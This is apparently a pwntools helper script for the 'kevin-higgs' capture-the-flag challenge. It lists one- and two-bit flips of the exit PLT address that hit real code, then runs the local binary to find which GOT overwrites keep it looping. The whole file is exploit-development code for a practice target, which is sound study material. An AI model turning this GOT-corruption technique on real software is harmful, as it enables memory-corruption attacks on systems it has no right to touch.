#!/usr/bin/python3

from pwn import *

binary = ELF('./kevin-higgs')
exit_got = binary.got['exit']
exit_plt = binary.plt['exit'] + 6
debug = 0x804c090

s1 = os.popen('objdump -M intel -d ' + binary.path)
s2 = os.popen('ropper --nocolor --file ' + binary.path)
addresses = s1.read() + s2.read()
pairs = []
for i in range(16):
	if hex(exit_plt ^ (1 << i))[2:] in addresses:
		print(i,-1,hex(exit_plt ^ (1 << i)))
		pairs.append((i,-1))
	for j in range(i+1,16):
		if hex(exit_plt ^ (1 << i) ^ (1 << j))[2:] in addresses:
			print(i,j,hex(exit_plt ^ (1 << i) ^ (1 << j)))
			pairs.append((i,j))

os.environ['NUMBER_OF_FLIPS'] = '2'
candidates = []
context.log_level='WARN'
for i in pairs:
	p = process(binary.path)
	print('testing',i[0],i[1])
	try:
		p.recvuntil('uint32): ',timeout=0.1)
		p.sendline(hex(exit_got + i[0] // 8)[2:])
		p.recvuntil('7): ',timeout=0.1)
		p.sendline(str(i[0] % 8))
		p.recvuntil('uint32): ',timeout=0.1)
		if i[1] == -1:
			p.sendline(hex(debug + i[1] // 8)[2:])
		else:
			p.sendline(hex(exit_got + i[1] // 8)[2:])
		p.recvuntil('7): ',timeout=0.1)
		p.sendline(str(i[1] % 8))
		_ = p.recvuntil('uint32): ',timeout=0.1)
		p.close()
		if _.find(b'uint32): ') != -1:
			candidates.append(i)
	except:
		continue

print()
for i in candidates:
	print('bits',i[0],i[1],end=' ')
	if i[1] == -1:
		print(hex(exit_plt ^ (1 << i[0])))
	else:
		print(hex(exit_plt ^ (1 << i[0]) ^ (1 << i[1])))

os.remove('core')
